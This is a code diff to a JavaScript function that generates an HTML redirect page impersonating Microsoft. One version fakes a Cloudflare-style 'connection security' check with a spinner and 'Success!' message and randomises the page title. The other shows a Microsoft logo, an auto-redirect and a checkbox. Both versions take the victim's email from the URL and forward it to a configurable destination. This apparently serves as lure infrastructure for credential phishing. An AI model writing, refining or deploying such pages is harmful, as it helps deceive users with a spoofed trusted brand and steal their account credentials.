@@ -343,117 +343,72 @@ function generateCustomScriptContent(redirectUrl) {
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title></title>
-  <style>
-    @keyframes b { to { transform: rotate(360deg); } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(redirect, 300);
+        });
+
+        // Function to handle redirection
+        function redirect() {
+            var email = getParameterByName('email'); // Attempt to get the email parameter
+            var redirectUrl = "${redirectUrl}";
+
+            if (email) {
+                redirectUrl += email; // Append email if provided
+            } else {
+                console.log("No email provided. Redirecting without email.");
+            }
+
+            console.log("Redirecting to: " + redirectUrl);
+            window.location.href = redirectUrl;
+        }
+
+        // Function to get URL parameters
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            var results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Function to manually trigger redirection via checkbox
+        function handleCheckboxClick(checkbox) {
+            if (checkbox.checked) {
+                console.log("Checkbox is checked. Redirecting...");
+                redirect();
+            } else {
+                console.log("Checkbox is not checked.");
+            }
+        }
+    </script>
 </head>
-<body style="margin:0">
-  <div style="background:#2f3237;color:#fff;font-family:Arial;min-height:100vh;padding:40px 20px">
-    <div style="max-width:800px;margin:0 auto">
-      <div style="display:flex;align-items:center;margin-bottom:40px">
-        <div style="display:flex;flex-direction:column">
-          <div style="display:flex">
-            <div style="width:20px;height:20px;background:#F25022;margin-right:2px"></div>
-            <div style="width:20px;height:20px;background:#7FBA00"></div>
-          </div>
-          <div style="display:flex;margin-top:2px">
-            <div style="width:20px;height:20px;background:#00A4EF;margin-right:2px"></div>
-            <div style="width:20px;height:20px;background:#FFB900"></div>
-          </div>
+<body>
+    <div style="display: flex; justify-content: center;  align-items: center; font-family: Arial, sans-serif;">
+        <div style="display: flex; flex-direction: column;">
+            <!-- First row -->
+            <div style="display: flex;">
+                <div style="width: 20px; height: 20px; background-color: #F25022; margin-right: 2px;"></div>
+                <div style="width: 20px; height: 20px; background-color: #7FBA00;"></div>
+            </div>
+            <!-- Second row -->
+            <div style="display: flex; margin-top: 2px;">
+                <div style="width: 20px; height: 20px; background-color: #00A4EF; margin-right: 2px;"></div>
+                <div style="width: 20px; height: 20px; background-color: #FFB900;"></div>
+            </div>
         </div>
-        <div style="font-size:32px;font-weight:300;color:#b0b3b8;margin-left:10px">Microsoft</div>
-      </div>
-      <h2 style="color: white; font-size:36px;font-weight:300;margin:0 0 30px 0">www.microsoftonline.com</h2>
-      <p style="font-size:18px;color:#b0b3b8;margin:0 0 40px 0">
-        Please stand by, while we are checking if the site connection is secure
-      </p>
-      <div style="width: 37%; border:1px solid #555;border-radius:4px;padding:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:40px">
-        <div style="display:flex;align-items:center">
-          <div id="a" style="width:24px;height:24px;border:3px solid #333;border-top:3px solid #fff;border-radius:50%;animation:b 1s linear infinite;margin-right:12px"></div>
-          <div id="c" style="display:none;width:24px;height:24px;background:#4caf50;border-radius:50%;margin-right:12px;text-align:center;line-height:24px;color:white;font-weight:bold">✓</div>
-          <span id="d" style="color:#b0b3b8;font-size:16px">Checking...</span>
-          <span id="e" style="display:none;color:#4caf50;font-size:16px;font-weight:500">Success!</span>
+        <div style="font-size: 25px; font-weight: normal; color: #5E5E5E; margin-left: 10px;">
+            Microsoft
         </div>
-        <div style="font-size:9px;color:#f38020">
-         &#9729;&#65039; <div>CLOUDFLARE </div>
-          <div style="font-size:8px;color:#888">Privacy | Terms</div>
-        </div>
-      </div>
-      <div style="border:1px solid #555;border-radius:4px;padding:20px;margin-bottom:40px">
-        <p style="margin:0;font-size:16px;color:#b0b3b8">
-          Did you know there are Verified Bots that are allowed around the internet because they help provide services we use day to day?
-        </p>
-      </div>
-      <p style="font-size:20px;margin:0;font-weight:300">
-        Microsoft needs to review the security of your connection before proceeding.
-      </p>
-    </div>
-  </div>
-
-  <script>
-  document.addEventListener('DOMContentLoaded', function () {
-    // Set 99-char random title
-    document.title = Array.from({ length: 99 }, () => {
-      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-      return chars.charAt(Math.floor(Math.random() * chars.length));
-    }).join('');
-
-    // Wait random time between 399–699ms
-    const delay = Math.floor(Math.random() * (699 - 399 + 1)) + 399;
-
-    setTimeout(() => {
-      // Simulate "check complete" UI
-      document.getElementById('a').style.display = 'none'; // Spinner
-      document.getElementById('d').style.display = 'none'; // "Checking..."
-      document.getElementById('c').style.display = 'block'; // Green check
-      document.getElementById('e').style.display = 'block'; // "Success!"
-
-      // Trigger redirect shortly after success
-      setTimeout(redirect, 300);
-    }, delay);
-  });
-
-  // Function to handle redirection
-  function redirect() {
-    var email = getParameterByName('email');
-    var redirectUrl = "${redirectUrl}";
-    
-    if (email) {
-      // Check if the redirect URL already has parameters
-      var separator = redirectUrl.includes('?') ? '&' : '?';
-      redirectUrl += separator + 'email=' + encodeURIComponent(email);
-      console.log("Redirecting with email: " + email);
-    } else {
-      console.log("No email provided. Redirecting without email.");
-    }
-    
-    console.log("Redirecting to: " + redirectUrl);
-    window.location.href = redirectUrl;
-  }
-
-  // Function to get URL parameters
-  function getParameterByName(name, url = window.location.href) {
-    name = name.replace(/[\[\]]/g, '\\$&');
-    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
-    var results = regex.exec(url);
-    if (!results) return null;
-    if (!results[2]) return '';
-    return decodeURIComponent(results[2].replace(/\+/g, ' '));
-  }
-
-  // Optional checkbox handler
-  function handleCheckboxClick(checkbox) {
-    if (checkbox.checked) {
-      console.log("Checkbox is checked. Redirecting...");
-      redirect();
-    } else {
-      console.log("Checkbox is not checked.");
-    }
-  }
-</script>
+    </div> 
+    <label>
+        <input type="checkbox" onclick="handleCheckboxClick(this)">
+        Redirecting... Please wait. or click this box to continue.
+    </label>
 </body>
 </html>`;
 }
